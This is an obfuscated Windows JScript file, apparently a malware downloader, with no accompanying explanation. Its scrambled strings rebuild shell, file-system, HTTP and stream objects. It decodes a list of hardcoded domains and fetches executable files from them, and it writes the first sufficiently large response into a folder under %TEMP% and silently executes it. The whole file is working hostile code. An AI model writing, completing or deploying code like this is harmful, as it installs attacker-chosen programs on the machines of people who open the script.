

function jgHOObWyX(lxmfDAHeqex) {
var WrbcLapw = "ZgST Ws WCENWlw cript.S wFMnZv hell".split(" ");
var HLLgaHqz = WScript.CreateObject(WrbcLapw[1] + WrbcLapw[3] + WrbcLapw[5]);
HLLgaHqz.Run(lxmfDAHeqex, 0x1, 0x0);
}
function agZygGgYQ(JIROW,nkgXE,Ssmcb) {
var urjWy = "pZCWeE DxZ pt.Shell pKZOpdk Scri  %TEMP%\\".split(" ");
var TUt=((1)?"W" + urjWy[4]:"")+urjWy[2];
var ZD = WScript.CreateObject(TUt);
return ZD.ExpandEnvironmentStrings(urjWy[6]);
}
function JIPDmsIX() {
var IPSZWep = "Sc DfWznJA r noUtzyfeU ipting BdJrNak FuD ile yRZebidiHbUwkR System aW HoTrs Obj ljxabP ect UwQzLRe".split(" ");
return IPSZWep[0] + IPSZWep[2] + IPSZWep[4] + ".F" + IPSZWep[7] + IPSZWep[9] + IPSZWep[12] + IPSZWep[14];
}
function yAoh(YDNjT) {
LeKrLUz = WScript.CreateObject(YDNjT);
return LeKrLUz
}
function wxos(gzXHp,PvaiX) {
gzXHp.write(PvaiX);
}
function mCpP(tgEVL) {
tgEVL.open();
}
function LCWK(RTJkO,bTFRJ) {
RTJkO.saveToFile(bTFRJ,476-474);
}
function KicG(nEMlv,dwODC,rjqyi) {
nEMlv.open(rjqyi,dwODC,false);
}
function RnOe(zbHZZ) {
if (zbHZZ == 980-780){return true;} else {return false;}
}
function TsIv(DWiPs) {
if (DWiPs > 155976-665){return true;} else {return false;}
}
function kLEF(BQyBW) {
var Gvggq="";
for(E=(164-164); E < BQyBW.length; E++)
if (E % (324-322) != (154-154)) {
Gvggq += BQyBW.substr(E, 966-965);
}
return Gvggq;
}
function CcCk(TeNGI) {
TeNGI.send();
}
function dual(eJWZY) {
return eJWZY.status;
}
function jUXJN(AvBjbm) {
return new ActiveXObject(AvBjbm);
}
function oNmJhDm(TOAX) {
TOAX.position=0;
}
function BmQrsUe(QbxE) {
return QbxE.responseBody;
}
var JP="oufjJaZj4aojOgHoug6oxfGfl.kcjo3mM/t8V03.leUxieT?I niBsatGh6exr3ezaBn6yybio8dKyhqJqt.WcwoBmJ/m8909.peGxkew?t I?B 0?2 C?";
var M = kLEF(JP).split(" ");
var mPB = agZygGgYQ("gpWr","zIkkV","BgwuLQ");
var hPp = jUXJN(JIPDmsIX());
var IqSbCv = ("nPRxXvv \\").split(" ");
var lmAe = mPB+IqSbCv[0]+IqSbCv[1];
try{
hPp.CreateFolder(lmAe);
}catch(EbCWPl){
};
var NwT = "2.XMLH";
var iNl = (NwT + "TTP" + " NhCbovP DdRPu XML ream St UaVFvsZC AD FGnEleN OD").split(" ");
var sJ = true  , TjQK = iNl[7] + "" + iNl[9];
var GW = yAoh("MS"+iNl[3]+(883475, iNl[0]));
var aDG = yAoh(TjQK + "B." + iNl[5]+(815478, iNl[4]));
var zQt = 0;
var H = 1;
var wtQMNkT = 189118;
var Q=zQt;
while (true)  {
if(Q>=M.length) {break;}
var LJ = 0;
var Wrw = ("ht" + " QnUlMHz tp popZf LUNajfjw :// EVpHeLc .e xe G ET").split(" ");
try  {
var YWtxu=Wrw[0]+Wrw[2]+Wrw[5];
KicG(GW,YWtxu+M[Q]+H, Wrw[9]+Wrw[10]); CcCk(GW); if (RnOe(dual(GW)))  {      
mCpP(aDG); aDG.type = 1; wxos(aDG,BmQrsUe(GW)); if (TsIv(aDG.size))  {
LJ = 1; oNmJhDm(aDG);LCWK(aDG,/*osLr2839lI*/lmAe/*1tKq49WxDU*/+wtQMNkT+Wrw[7]+Wrw[8]); try  {
if (((new Date())>0,7364085888)) {
jgHOObWyX(lmAe+wtQMNkT+/*SySp36DD8q*/Wrw[7]+Wrw[8]/*021I62iX8m*/); 
break;
}
}
catch (AK)  {
}; 
}; aDG.close(); 
}; 
if (LJ == 1)  {
zQt = Q; break; 
}; 
}
catch (AK)  { 
}; 
Q++;
}; 

